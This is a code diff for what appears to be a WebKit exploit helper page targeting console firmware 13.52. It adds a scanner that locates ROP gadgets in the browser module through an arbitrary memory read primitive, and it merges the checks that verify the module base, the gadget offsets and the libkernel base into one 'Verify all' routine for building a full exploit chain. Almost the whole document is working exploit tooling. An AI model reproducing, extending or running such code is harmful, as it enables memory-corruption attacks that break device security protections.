@@ -19,7 +19,7 @@ let lengthMissStreak = 0;
 const calRetain = [];
 
 const LOG_MAX = 500;
-const BUILD_ID = "cal-20250827e";
+const BUILD_ID = "cal-20250827g";
 const CAL_ALIGN_STEP = 0x4000;
 const ELF_MAGIC = 0x464c457f;
 /** 13.52 retail test anchor — assumed correct unless cal proves otherwise */
@@ -37,6 +37,10 @@ const WALK_LOG_EVERY = parseInt(params.get("walklog") || "1024", 10);
 /** auto vtable walk after Start unless ?vtable=0 */
 const AUTO_VTABLE_WALK = params.get("vtable") !== "0";
 const CORE_LOG = /ADDROF|FAIL|ERROR|PRIMITIVE|PASS|GIVE-UP|ATTEMPT|SETUP|CARRIER|PAIR|SSV-|TRIM-DEBRIS|ADDROF-RELEASE|FAKE-ADDRESS|READ-PRIMITIVE|PLACEMENT|COMPOSITION|NORMAL-CLONE|ZERO-HEADER|VALIDATION|LOAD-THREW|NO-RESULT|PRIMITIVE-OK|AUTO-RETRY|CORE-GIVE-UP|CAL-|GADGET|ELF|BASES|LK-|PASTE|HINT-GROOM/i;
+/** Scan .text for pop/leave gadgets when 13.50 RVAs miss on 13.52 */
+const SCAN_GADGET_MIN = 0x10000;
+const SCAN_GADGET_MAX = parseInt(params.get("scanmax") || "4800000", 16);
+const SCAN_NEAR_RADIUS = parseInt(params.get("scanrad") || "200000", 16);
 
 const GADGET_CHECKS = [
     ["POP_RDI", "wk_POP_RDI_RET", [0x5f, 0xc3]],
@@ -113,12 +117,13 @@ function wireGroomBar() {
 }
 
 let outEl, stateEl, resultEl, nativeFnEl, baseEl, expm1In, baseIn;
-let btnStart, btnLite, btnWide, btnVerify, btnSetExpm1, btnSetBase, btnAssume, btnFindBase, btnFindBaseVtable, btnVerify2, btnSetExpm12, btnSetBase2, btnProbe, btnCopy, btnClear;
+let btnStart, btnLite, btnWide, btnVerify, btnScanGadgets, btnSetExpm1, btnSetBase, btnAssume, btnFindBase, btnFindBaseVtable, btnVerify2, btnSetExpm12, btnSetBase2, btnProbe, btnCopy, btnClear;
 let calBarEl;
 let scanMode = "lite";
 let scanIndex = 0;
 let scanList = [];
 let verifyGadgetOk = 0;
+let lastGadgetReport = "";
 
 const SS_CANDIDATE = "wk-cal-candidate";
 const SS_MANUAL_BASE = "wk-manual-base";
@@ -153,6 +158,7 @@ function setUi() {
     setCalButton(btnLite, calReady);
     setCalButton(btnWide, calReady);
     setCalButton(btnVerify, calReady);
+    setCalButton(btnScanGadgets, calReady && !!activeBase());
     setCalButton(btnSetExpm1, calReady);
     setCalButton(btnSetBase, calReady);
     setCalButton(btnAssume, calReady);
@@ -204,7 +210,7 @@ const SS_FIND_BASE_I = "wk-cal-findbase-i";
 const SS_VTABLE_FIND_I = "wk-cal-vtable-find-i";
 const SS_VTABLE_PTR = "wk-vtablePtr";
 
-const PIN_TAGS = /^WEBCORE|^CELL-SCAN|^TEXTAREA|^VTABLE|^MODULE-HIT|^CAL-ELF|^CAL-MODULE|^ELF-|^WALK-ANCHOR|^BOOT|^AUTO\b|^GADGET/;
+const PIN_TAGS = /^WEBCORE|^CELL-SCAN|^TEXTAREA|^VTABLE|^MODULE-HIT|^CAL-ELF|^CAL-MODULE|^ELF-|^WALK-ANCHOR|^BOOT|^AUTO\b|^GADGET|^GADGET-REPORT/;
 const pinnedLines = [];
 
 function renderOut() {
@@ -225,6 +231,26 @@ function mark(tag, detail) {
     lines.push(line);
     if (lines.length > LOG_MAX) lines.splice(0, lines.length - LOG_MAX);
     renderOut();
+}
+
+function markBlock(tag, lines) {
+    const body = Array.isArray(lines) ? lines.join("\n") : String(lines);
+    mark(tag, body);
+}
+
+function markGadgetReport(lines) {
+    const body = lines.join("\n");
+    lastGadgetReport = body;
+    markBlock("GADGET-REPORT", lines);
+    if (resultEl && ready) {
+        const delta = activeDelta();
+        const base = activeBase();
+        resultEl.textContent = [
+            "base=" + (base ? String(base) : "?"),
+            delta > 0 ? "expm1=0x" + delta.toString(16) : "",
+            body,
+        ].filter(Boolean).join("\n");
+    }
 }
 
 function ptrFromNum(n) {
@@ -845,7 +871,7 @@ function prefillSuggestedExpm1(fn, off) {
     if (!(guess > 0)) return 0;
     if (expm1In) expm1In.value = guess.toString(16);
     mark("CAL-GUESS", "expm1=0x" + guess.toString(16) + " base=" + baseFromDelta(fn, guess)
-        + " (assumed — tap Assume to skip verify, or Verify step to check)");
+        + " (assumed — tap Assume to skip verify, or Verify all to check)");
     updateResultPanel();
     return guess;
 }
@@ -922,6 +948,16 @@ function updateResultPanel() {
     }
     if (resultEl) {
         if (!calibrated) {
+            if (lastGadgetReport) {
+                const base = activeBase();
+                const delta = activeDelta();
+                resultEl.textContent = [
+                    "base=" + (base ? String(base) : "?"),
+                    delta > 0 ? "expm1=0x" + delta.toString(16) : "",
+                    lastGadgetReport,
+                ].filter(Boolean).join("\n");
+                return;
+            }
             resultEl.textContent = "no verified expm1 yet";
             return;
         }
@@ -940,6 +976,7 @@ function updateResultPanel() {
             calibrated.libkernelBase ? "libkernel=" + calibrated.libkernelBase : "libkernel=(IAT not verified)",
             "gadgets=" + calibrated.gadgetOk + "/" + calibrated.gadgetTotal,
             elfLine,
+            lastGadgetReport ? "\n" + lastGadgetReport : "",
         ].join("\n");
     }
 }
@@ -959,6 +996,261 @@ function checkGadgetBytes(p, base, rva, pat) {
         if (b == null || b !== pat[i]) return false;
     }
     return true;
+}
+
+function checkOneGadget(p, base, row) {
+    const name = row[0];
+    const key = row[1];
+    const pat = row[2];
+    const rva = tableOff[key];
+    if (rva == null)
+        return { name, key, rva: null, ok: null, line: name + " SKIP (no rva)" };
+    if (checkGadgetBytes(p, base, rva, pat))
+        return { name, key, rva, ok: true, line: name + " +0x" + rva.toString(16) + " OK" };
+    const a = base.add32(rva);
+    const got = [];
+    for (let bi = 0; bi < pat.length; bi++) {
+        if (pat[bi] === null) continue;
+        const b = read1p(p, a.add32(bi));
+        got.push(b == null ? "?" : b.toString(16));
+    }
+    return {
+        name, key, rva, ok: false,
+        line: name + " +0x" + rva.toString(16) + " BAD got=" + got.join(",")
+            + " want=" + pat.filter(x => x != null).join(","),
+    };
+}
+
+function verifyModuleBaseOnce(p, startBase) {
+    let useBase = startBase;
+    let magic = read4p(p, useBase);
+    const refined = ensureElfModuleBase(p, useBase, 2048);
+    useBase = refined.base;
+    magic = read4p(p, useBase);
+    if (ptrNum(useBase) !== ptrNum(startBase)) {
+        manualBase = useBase;
+        try { sessionStorage.setItem(SS_MANUAL_BASE, String(useBase)); } catch (_) { }
+        if (baseIn) baseIn.value = ptrNum(useBase).toString(16);
+        const nd = nativeFn ? impliedExpm1FromBase(nativeFn, useBase) : 0;
+        if (nd > 0 && expm1In) expm1In.value = nd.toString(16);
+        updateResultPanel();
+    }
+    if (magic === ELF_MAGIC)
+        return { ok: true, base: useBase, line: "base ELF OK " + useBase };
+    const kind = classifyModulePage(p, useBase);
+    if (kind === "text" || kind === "data" || refined.poopsBase)
+        return {
+            ok: true, base: useBase,
+            line: "base MODULE OK " + useBase + " kind=" + (kind || refined.kind || "gadget")
+                + " peek=" + fmtMagic(magic),
+        };
+    if (tableOff && checkGadgetBytes(p, useBase, tableOff.wk_POP_RDI_RET, [0x5f, 0xc3]))
+        return {
+            ok: true, base: useBase,
+            line: "base GADGET OK " + useBase + " POP_RDI @+"
+                + tableOff.wk_POP_RDI_RET.toString(16),
+        };
+    return {
+        ok: false, base: useBase,
+        line: "base FAIL " + useBase + " got=" + fmtMagic(magic),
+    };
+}
+
+function verifyLibkernelOnce(p, base) {
+    if (!tableOff.wk___imp___error || !tableOff.k__error)
+        return { ok: null, lkBase: null, line: "libkernel SKIP (no IAT offsets)" };
+    const errorFn = read8p(p, base.add32(tableOff.wk___imp___error));
+    if (!errorFn)
+        return { ok: false, lkBase: null, line: "libkernel IAT-FAIL @+"
+            + tableOff.wk___imp___error.toString(16) };
+    const lk = errorFn.sub32(tableOff.k__error);
+    const w0 = read4p(p, lk);
+    const w1 = read4p(p, lk.add32(4));
+    if (w1 != null && (w0 & 0xff) === 0xb8 && (w1 & 0xffff) === 0x050f)
+        return { ok: true, lkBase: lk, line: "libkernel OK " + lk };
+    return { ok: false, lkBase: null, line: "libkernel BAD prologue @ " + lk
+        + " w0=" + fmtMagic(w0) + " w1=" + fmtMagic(w1) };
+}
+
+function bytesFromRead8(w) {
+    const out = [];
+    let v = w.low >>> 0;
+    for (let i = 0; i < 4; i++) {
+        out.push(v & 0xff);
+        v >>>= 8;
+    }
+    v = w.hi >>> 0;
+    for (let i = 0; i < 4; i++) {
+        out.push(v & 0xff);
+        v >>>= 8;
+    }
+    return out;
+}
+
+function matchPatAt(bytes, startOff, pat) {
+    for (let pi = 0; pi < pat.length; pi++) {
+        if (pat[pi] === null) continue;
+        const bi = startOff + pi;
+        if (bi >= bytes.length) return false;
+        if (bytes[bi] !== pat[pi]) return false;
+    }
+    return true;
+}
+
+function findPatInRead8(bytes, pat) {
+    for (let start = 0; start < 8; start++) {
+        if (matchPatAt(bytes, start, pat)) return start;
+    }
+    return -1;
+}
+
+function pickBestGadgetMatch(hits, hintRva) {
+    if (!hits || hits.length === 0) return null;
+    if (!(hintRva > 0)) return hits[0];
+    let best = hits[0];
+    let bestDist = Math.abs(best - hintRva);
+    for (let i = 1; i < hits.length; i++) {
+        const d = Math.abs(hits[i] - hintRva);
+        if (d < bestDist) {
+            best = hits[i];
+            bestDist = d;
+        }
+    }
+    return best;
+}
+
+async function collectGadgetMatches(p, base, pat, minRva, maxRva, maxHits) {
+    const hits = [];
+    const lo = minRva & ~7;
+    for (let rva = lo; rva < maxRva; rva += 8) {
+        const w = read8p(p, base.add32(rva));
+        if (!w) continue;
+        const off = findPatInRead8(bytesFromRead8(w), pat);
+        if (off >= 0) {
+            hits.push(rva + off);
+            if (hits.length >= maxHits) break;
+        }
+        if ((rva & 0x3ffff) === 0)
+            await new Promise(r => setTimeout(r, 0));
+    }
+    return hits;
+}
+
+async function scanOneGadgetRow(p, base, row, minRva, maxRva, quiet) {
+    const name = row[0];
+    const key = row[1];
+    const pat = row[2];
+    const hint = tableOff && tableOff[key] != null ? tableOff[key] : 0;
+    if (!quiet) {
+        mark("GADGET-SCAN", name + " 0x" + minRva.toString(16) + "..0x" + maxRva.toString(16)
+            + (hint ? " hint=0x" + hint.toString(16) : ""));
+    }
+    const hits = await collectGadgetMatches(p, base, pat, minRva, maxRva, 48);
+    const picked = pickBestGadgetMatch(hits, hint);
+    if (picked != null) {
+        if (!quiet) {
+            mark("GADGET-SCAN-HIT", name + " @+0x" + picked.toString(16)
+                + (hits.length > 1 ? " (" + hits.length + " hits, nearest to hint)" : ""));
+        }
+        return { name, key, rva: picked, hits: hits.length };
+    }
+    if (!quiet) mark("GADGET-SCAN-MISS", name);
+    return { name, key, rva: null, hits: 0 };
+}
+
+function applyScannedGadgets(found, reportLines) {
+    if (!tableOff) return;
+    tableOff = Object.assign({}, tableOff, found);
+    try { sessionStorage.setItem("wk-scanned-gadgets", JSON.stringify(found)); } catch (_) { }
+    const lines = reportLines || [];
+    lines.push("--- scanned RVAs ---");
+    for (let gi = 0; gi < GADGET_CHECKS.length; gi++) {
+        const key = GADGET_CHECKS[gi][1];
+        const name = GADGET_CHECKS[gi][0];
+        const rva = found[key];
+        lines.push(name + " +0x" + (rva != null ? rva.toString(16) : "MISS"));
+    }
+    const jsonParts = {};
+    for (const key of Object.keys(found))
+        jsonParts[key] = "0x" + found[key].toString(16);
+    lines.push("json " + JSON.stringify(jsonParts));
+    markGadgetReport(lines);
+    clearVerifyProgress();
+    mark("HINT", "tap Verify all — uses scanned RVAs");
+}
+
+async function runScanGadgets() {
+    if (busy || !ready || !window.p || !nativeFn) return;
+    const base = activeBase();
+    if (!base) {
+        mark("CAL-FAIL", "no base — Set base + expm1 first");
+        state("need base", "bad");
+        return;
+    }
+    busy = true;
+    setUi();
+    preCalTrim();
+    const p = window.p;
+    const delta = activeDelta();
+    const reportHead = [
+        "build=" + BUILD_ID + " (scan)",
+        "base=" + base + (delta > 0 ? " expm1=0x" + delta.toString(16) : ""),
+    ];
+    state("scanning gadgets…", "warn");
+
+    const found = {};
+    const scanLines = [];
+    try {
+        for (let gi = 0; gi < GADGET_CHECKS.length; gi++) {
+            const row = GADGET_CHECKS[gi];
+            const key = row[1];
+            const hint = tableOff && tableOff[key] != null ? tableOff[key] : 0;
+            let minRva = SCAN_GADGET_MIN;
+            let maxRva = SCAN_GADGET_MAX;
+            if (hint > 0) {
+                minRva = Math.max(SCAN_GADGET_MIN, hint - SCAN_NEAR_RADIUS);
+                maxRva = Math.min(SCAN_GADGET_MAX, hint + SCAN_NEAR_RADIUS);
+            }
+            state("scan " + row[0] + " (near)…", "warn");
+            let hit = await scanOneGadgetRow(p, base, row, minRva, maxRva, true);
+            if (hit.rva != null) {
+                found[key] = hit.rva;
+                scanLines.push(row[0] + " +0x" + hit.rva.toString(16) + " (near)");
+            }
+        }
+
+        const missing = GADGET_CHECKS.filter(r => found[r[1]] == null);
+        if (missing.length > 0) {
+            state("wide scan " + missing.length + " missing…", "warn");
+            for (let gi = 0; gi < GADGET_CHECKS.length; gi++) {
+                const row = GADGET_CHECKS[gi];
+                const key = row[1];
+                if (found[key] != null) continue;
+                state("wide " + row[0] + "…", "warn");
+                const hit = await scanOneGadgetRow(p, base, row, SCAN_GADGET_MIN, SCAN_GADGET_MAX, true);
+                if (hit.rva != null) {
+                    found[key] = hit.rva;
+                    scanLines.push(row[0] + " +0x" + hit.rva.toString(16) + " (wide)");
+                } else {
+                    scanLines.push(row[0] + " MISS");
+                }
+            }
+        }
+
+        const stillMissing = GADGET_CHECKS.filter(r => found[r[1]] == null);
+        if (stillMissing.length > 0) {
+            reportHead.push("scan FAIL missing: " + stillMissing.map(r => r[0]).join(", "));
+            markGadgetReport(reportHead.concat(["--- scan ---"], scanLines));
+            state("gadget scan incomplete", "bad");
+            return;
+        }
+
+        applyScannedGadgets(found, reportHead.concat(["--- scan ---"], scanLines));
+        state("gadget RVAs scanned — tap Verify all", "ok");
+    } finally {
+        busy = false;
+        setUi();
+    }
 }
 
 function applyCalibration(delta, base, libkernelBase, gadgetOk, opts) {
@@ -1103,6 +1395,13 @@ async function runStart() {
 
     const detected = offsetsFor(navigator.userAgent);
     tableOff = (offsetsForKey(detected.key || "13.52").off) || offsetsForKey("13.52").off;
+    try {
+        const scanned = sessionStorage.getItem("wk-scanned-gadgets");
+        if (scanned) {
+            tableOff = Object.assign({}, tableOff, JSON.parse(scanned));
+            mark("BOOT", "restored scanned gadget RVAs from session");
+        }
+    } catch (_) { }
     mark("UA-FW", detected.key || "unknown");
     mark("GOAL", "find wk_expm1_builtin for 13.52 retail");
     state("getting primitive…", "warn");
@@ -1167,7 +1466,7 @@ async function runStart() {
             mark("AUTO", "2e vtable walk starting…");
             await walkVtableForBase();
         } else {
-            mark("NEXT", "tap 2e to re-run vtable walk OR Verify step");
+            mark("NEXT", "tap 2e to re-run vtable walk OR Verify all");
             state("primitive OK — vtable walk skipped", "ok");
         }
         try { if (expm1In) expm1In.focus(); } catch (_) { }
@@ -1201,7 +1500,7 @@ async function runScanStep(mode) {
                     + nativeFn.sub32(guess));
             }
             mark("HINT", "scan miss is OK on 13.52 — tap Set expm1 (0 reads), skip lite scan");
-            mark("HINT", "then Verify step tap 1 for CAL-ELF-OK (optional)");
+            mark("HINT", "then Verify all for module check (optional)");
             state("scan done — use Set expm1", "warn");
             return;
         }
@@ -1228,7 +1527,7 @@ async function runScanStep(mode) {
         } catch (_) { }
         clearVerifyProgress();
         applyElfHit(hit.delta, hit.base);
-        mark("CAL-MORE", "tap Verify step (1 read/tap) OR Assume if skipping verify");
+        mark("CAL-MORE", "tap Verify all OR Assume if skipping verify");
         state("ELF hit — Verify or Assume", "ok");
     } finally {
         busy = false;
@@ -1256,7 +1555,7 @@ function runSetExpm1() {
     mark("CAL-SET", "expm1=0x" + delta.toString(16) + " base=" + base2 + " (0 reads)");
     if (base2 && base && (base2.low !== base.low || base2.hi !== base.hi))
         mark("CAL-NOTE", "sub32 base=" + base + " ptr base=" + base2);
-    mark("HINT", "tap Probe ELF if Verify step 1 fails on this delta");
+    mark("HINT", "tap Probe ELF if Verify all fails on this delta");
     state("expm1 set (0 reads)", "ok");
 }
 
@@ -1280,7 +1579,7 @@ function runSetBase() {
     clearVerifyProgress();
     updateResultPanel();
     mark("CAL-SET-BASE", "base=" + base + " (manual, 0 reads — expm1 unchanged)");
-    mark("HINT", "tap Assume expm1 OR Verify step (uses this base if Set base was last)");
+    mark("HINT", "tap Assume expm1 OR Verify all (uses this base if Set base was last)");
     state("base set (0 reads)", "ok");
 }
 
@@ -1354,7 +1653,7 @@ async function walkVtableForBase() {
         const base = await walkOneAnchor(p, a.ptr, a.label);
         if (base) {
             applyBaseFound(base, "walk/" + a.label);
-            mark("NEXT", "Verify step to confirm gadgets");
+            mark("NEXT", "Verify all to confirm gadgets");
             state("base found via " + a.label, "ok");
             return true;
         }
@@ -1422,7 +1721,7 @@ async function runFindBase() {
                 const resolved = resolveModuleBase(p, base, kind);
                 try { sessionStorage.removeItem(SS_FIND_BASE_I); } catch (_) { }
                 applyBaseFound(resolved, "nativeFn-walk/" + kind);
-                mark("NEXT", "Verify step to confirm gadgets");
+                mark("NEXT", "Verify all to confirm gadgets");
                 state("base found via nativeFn walk", "ok");
                 return;
             }
@@ -1435,7 +1734,7 @@ async function runFindBase() {
 
         try { sessionStorage.removeItem(SS_FIND_BASE_I); } catch (_) { }
         applyBaseFound(base, "nativeFn-walk");
-        mark("NEXT", "Verify step to confirm gadgets");
+        mark("NEXT", "Verify all to confirm gadgets");
         state("ELF found via walk-back", "ok");
     } finally {
         busy = false;
@@ -1490,7 +1789,7 @@ async function runProbeElf() {
         }
 
         applyElfHit(delta, base);
-        mark("NEXT", "tap Verify step or Assume");
+        mark("NEXT", "tap Verify all or Assume");
         state("ELF found — Verify or Assume", "ok");
     } finally {
         busy = false;
@@ -1498,9 +1797,9 @@ async function runProbeElf() {
     }
 }
 
-async function runVerifyStep() {
+async function runVerifyAll() {
     if (busy || !ready || !window.p || !nativeFn) return;
-    const base = activeBase();
+    let base = activeBase();
     if (!base) {
         mark("CAL-FAIL", "no base — type expm1 or base, then Set");
         state("need expm1 or base", "bad");
@@ -1511,6 +1810,8 @@ async function runVerifyStep() {
     busy = true;
     setUi();
     preCalTrim();
+    clearVerifyProgress();
+    clearLkProgress();
 
     const p = window.p;
     if (manualBase)
@@ -1523,183 +1824,69 @@ async function runVerifyStep() {
         return;
     }
 
-    let step = 0;
-    try { step = parseInt(sessionStorage.getItem(SS_VSTEP) || "0", 10) || 0; } catch (_) { }
-    try { verifyGadgetOk = parseInt(sessionStorage.getItem(SS_VGAD_OK) || "0", 10) || 0; } catch (_) { }
-
-    const totalSteps = 1 + GADGET_CHECKS.length + 3;
-    mark("VERIFY-STEP", (step + 1) + "/" + totalSteps
-        + (delta > 0 ? " expm1=0x" + delta.toString(16) : "")
-        + " base=" + base);
-    state("verify " + (step + 1) + "/" + totalSteps + "…", "warn");
+    state("verify all…", "warn");
 
     try {
         await new Promise(r => setTimeout(r, 64));
 
-        if (step === 0) {
-            let useBase = base;
-            let magic = read4p(p, useBase);
-            const refined = ensureElfModuleBase(p, useBase, 2048);
-            useBase = refined.base;
-            magic = read4p(p, useBase);
-            if (ptrNum(useBase) !== ptrNum(base)) {
-                manualBase = useBase;
-                base = useBase;
-                try { sessionStorage.setItem(SS_MANUAL_BASE, String(useBase)); } catch (_) { }
-                if (baseIn) baseIn.value = ptrNum(useBase).toString(16);
-                const nd = nativeFn ? impliedExpm1FromBase(nativeFn, useBase) : 0;
-                if (nd > 0 && expm1In) expm1In.value = nd.toString(16);
-                updateResultPanel();
-            }
+        const baseResult = verifyModuleBaseOnce(p, base);
+        base = baseResult.base;
+        const report = [
+            "build=" + BUILD_ID + " (verify)",
+            "base=" + base + (delta > 0 ? " expm1=0x" + delta.toString(16) : ""),
+            baseResult.line,
+        ];
 
-            let stepOk = false;
-            if (magic === ELF_MAGIC) {
-                mark("CAL-ELF-OK", "ELF base=" + useBase);
-                stepOk = true;
-            } else {
-                const kind = classifyModulePage(p, useBase);
-                if (kind === "text" || kind === "data" || refined.poopsBase) {
-                    mark("CAL-MODULE-OK", "poops-style base=" + useBase
-                        + " kind=" + (kind || refined.kind || "gadget")
-                        + " peek=" + fmtMagic(magic));
-                    stepOk = true;
-                } else if (tableOff && checkGadgetBytes(p, useBase, tableOff.wk_POP_RDI_RET, [0x5f, 0xc3])) {
-                    mark("CAL-MODULE-OK", "base=" + useBase + " POP_RDI @+"
-                        + tableOff.wk_POP_RDI_RET.toString(16) + " OK");
-                    stepOk = true;
-                }
-            }
-
-            if (!stepOk) {
-                clearVerifyProgress();
-                mark("CAL-FAIL", "step1 base=" + useBase + " got=" + fmtMagic(magic)
-                    + " — not ELF/text/gadget");
-                mark("HINT", "re-Start for vtable walk; or Set base 840cfc530 + expm1 eb6350");
-                state("verify step 1 fail", "bad");
-                return;
-            }
-            try { sessionStorage.setItem(SS_VSTEP, "1"); } catch (_) { }
-            mark("CAL-MORE", "tap Verify step (" + 2 + "/" + totalSteps + ") for gadgets");
-            state("base OK — verify gadgets", "ok");
+        if (!baseResult.ok) {
+            report.push("summary FAIL — bad base");
+            markGadgetReport(report);
+            mark("HINT", "re-Start for vtable walk; or Set base + expm1 eb6350");
+            state("verify fail — bad base", "bad");
             return;
         }
 
-        if (step >= 1 && step <= GADGET_CHECKS.length) {
-            const gi = step - 1;
+        report.push("--- gadgets ---");
+        verifyGadgetOk = 0;
+        let anyBad = false;
+        for (let gi = 0; gi < GADGET_CHECKS.length; gi++) {
             const row = GADGET_CHECKS[gi];
-            const name = row[0];
-            const key = row[1];
-            const pat = row[2];
-            const rva = tableOff[key];
-            if (rva == null) {
-                mark("GADGET-SKIP", name + " (no rva in table)");
-            } else if (checkGadgetBytes(p, base, rva, pat)) {
-                verifyGadgetOk++;
-                mark("GADGET-OK", name + " @+" + rva.toString(16));
-            } else {
-                const a = base.add32(rva);
-                const got = [];
-                for (let bi = 0; bi < pat.length; bi++) {
-                    if (pat[bi] === null) continue;
-                    const b = read1p(p, a.add32(bi));
-                    got.push(b == null ? "?" : b.toString(16));
-                }
-                mark("GADGET-BAD", name + " @+" + rva.toString(16)
-                    + " got=" + got.join(",") + " want=" + pat.filter(x => x != null).join(","));
-            }
-            try {
-                sessionStorage.setItem(SS_VGAD_OK, String(verifyGadgetOk));
-                sessionStorage.setItem(SS_VSTEP, String(step + 1));
-            } catch (_) { }
-            if (step + 1 <= GADGET_CHECKS.length)
-                mark("CAL-MORE", "tap Verify step (" + (step + 2) + "/" + totalSteps + ")");
-            else
-                mark("CAL-MORE", "tap Verify step for libkernel (1 read/tap ×3)");
-            return;
+            const g = checkOneGadget(p, base, row);
+            report.push(g.line);
+            if (g.ok === true) verifyGadgetOk++;
+            else if (g.ok === false) anyBad = true;
+            if ((gi & 1) === 1)
+                await new Promise(r => setTimeout(r, 0));
         }
+        report.push("summary " + verifyGadgetOk + "/" + GADGET_CHECKS.length + " OK");
 
-        const lkStep = step - 1 - GADGET_CHECKS.length;
-        if (!tableOff.wk___imp___error || !tableOff.k__error) {
-            if (verifyGadgetOk >= 6) {
-                applyCalibration(delta > 0 ? delta : impliedExpm1FromBase(nativeFn, base),
-                    base, null, verifyGadgetOk);
-            } else {
-                mark("CAL-FAIL", "gadgets " + verifyGadgetOk + "/" + GADGET_CHECKS.length);
-            }
-            return;
-        }
+        const lk = verifyLibkernelOnce(p, base);
+        report.push(lk.line);
 
-        if (lkStep === 0) {
-            mark("LK-TRY", "1/3 IAT webkit+" + tableOff.wk___imp___error.toString(16));
-            const errorFn = read8p(p, base.add32(tableOff.wk___imp___error));
-            if (!errorFn) {
-                clearLkProgress();
-                mark("LK-FAIL", "IAT read failed");
-                if (verifyGadgetOk >= 6)
-                    applyCalibration(delta > 0 ? delta : impliedExpm1FromBase(nativeFn, base),
-                        base, null, verifyGadgetOk);
-                return;
-            }
-            try {
-                sessionStorage.setItem(SS_LK_ERROR, String(errorFn));
-                sessionStorage.setItem(SS_LK_STEP, "1");
-                sessionStorage.setItem(SS_VSTEP, String(step + 1));
-            } catch (_) { }
-            mark("CAL-MORE", "tap Verify step (libkernel 2/3)");
-            return;
-        }
+        markGadgetReport(report);
 
-        const errorFn = parseAddr(sessionStorage.getItem(SS_LK_ERROR));
-        const lk = errorFn ? errorFn.sub32(tableOff.k__error) : null;
-
-        if (lkStep === 1) {
-            mark("LK-TRY", "2/3 __error @ " + lk);
-            const w0 = read4p(p, lk);
-            if (w0 == null) {
-                clearLkProgress();
-                mark("LK-FAIL", "lk read failed");
-                if (verifyGadgetOk >= 6)
-                    applyCalibration(delta > 0 ? delta : impliedExpm1FromBase(nativeFn, base),
-                        base, null, verifyGadgetOk);
-                return;
-            }
-            try {
-                sessionStorage.setItem(SS_LK_W0, "0x" + (w0 >>> 0).toString(16));
-                sessionStorage.setItem(SS_LK_STEP, "2");
-                sessionStorage.setItem(SS_VSTEP, String(step + 1));
-            } catch (_) { }
-            mark("CAL-MORE", "tap Verify step (libkernel 3/3)");
-            return;
-        }
-
-        mark("LK-TRY", "3/3 verify prologue");
-        const w0 = parseInt(sessionStorage.getItem(SS_LK_W0) || "0", 16);
-        const w1 = read4p(p, lk.add32(4));
-        clearLkProgress();
-
-        let lkBase = null;
-        if (w1 != null && (w0 & 0xff) === 0xb8 && (w1 & 0xffff) === 0x050f) {
-            lkBase = lk;
-            mark("LK-OK", String(lk));
-        } else {
-            mark("LK-BAD", "prologue mismatch");
-        }
+        if (anyBad && verifyGadgetOk === 0)
+            mark("HINT", "13.50 gadget RVAs wrong on 13.52 — tap 4b Scan gadgets, then Verify all");
 
         if (verifyGadgetOk >= 4) {
             applyCalibration(delta > 0 ? delta : impliedExpm1FromBase(nativeFn, base),
-                base, lkBase, verifyGadgetOk);
+                base, lk.ok ? lk.lkBase : null, verifyGadgetOk);
             if (verifyGadgetOk < 6)
-                mark("CAL-WARN", "gadgets " + verifyGadgetOk + "/8 — partial OK (need 6 for full chain)");
+                mark("CAL-WARN", "partial gadgets " + verifyGadgetOk + "/8 — need 6 for full chain");
+            state("verify OK " + verifyGadgetOk + "/8", "ok");
         } else {
             mark("CAL-FAIL", "gadgets " + verifyGadgetOk + "/" + GADGET_CHECKS.length
-                + " (need ≥4 partial, ≥6 full) — 13.50 RVAs may differ on 13.52");
-            mark("HINT", "ELF base OK — gadget table may need 13.52 dump; base+expm1 still valid");
-            state("gadget verify weak", "warn");
+                + " (need ≥4) — tap Scan gadgets");
+            state("gadget verify fail", "bad");
         }
     } finally {
         busy = false;
         setUi();
     }
+}
+
+/** @deprecated alias — one tap runs full verify */
+async function runVerifyStep() {
+    return runVerifyAll();
 }
 
 function runCopy() {
@@ -1747,6 +1934,7 @@ function init() {
     btnLite = $("btn-lite");
     btnWide = $("btn-wide");
     btnVerify = $("btn-verify");
+    btnScanGadgets = $("btn-scan-gadgets");
     btnSetExpm1 = $("btn-set-expm1");
     btnSetBase = $("btn-set-base");
     btnAssume = $("btn-assume");
@@ -1768,8 +1956,9 @@ function init() {
     wireClick(btnStart, function () { return runStart(); });
     wireClick(btnLite, function () { return runScanStep("lite"); });
     wireClick(btnWide, function () { return runScanStep("wide"); });
-    wireClick(btnVerify, function () { return runVerifyStep(); });
-    wireClick(btnVerify2, function () { return runVerifyStep(); });
+    wireClick(btnVerify, function () { return runVerifyAll(); });
+    wireClick(btnVerify2, function () { return runVerifyAll(); });
+    wireClick(btnScanGadgets, function () { return runScanGadgets(); });
     wireClick(btnSetExpm1, runSetExpm1);
     wireClick(btnSetExpm12, runSetExpm1);
     wireClick(btnSetBase, runSetBase);
